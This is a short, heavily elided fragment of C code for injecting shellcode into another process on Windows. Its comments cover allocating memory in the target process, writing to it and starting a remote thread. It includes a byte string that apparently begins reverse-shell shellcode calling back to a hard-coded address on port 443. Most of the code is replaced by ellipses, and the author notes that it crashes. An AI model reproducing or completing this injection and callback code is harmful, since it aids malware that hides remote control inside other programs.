...
//this is the shell code this is going to make it crash currently
//im injecting garbo into process
...
"\x89\xe5\x49\xbc\x02\x00\x01\xbb\x0a\x00\x00\x5b\x41\x54"
...
int main(int argc, char* argv[]) {
    ...
    //alocate bytes to the process memory
    ...
    //actually writes the allocated memory into the process memory
    ...
    //if thread fails to be created the handle to the process is closed
    if (hThread == NULL) {
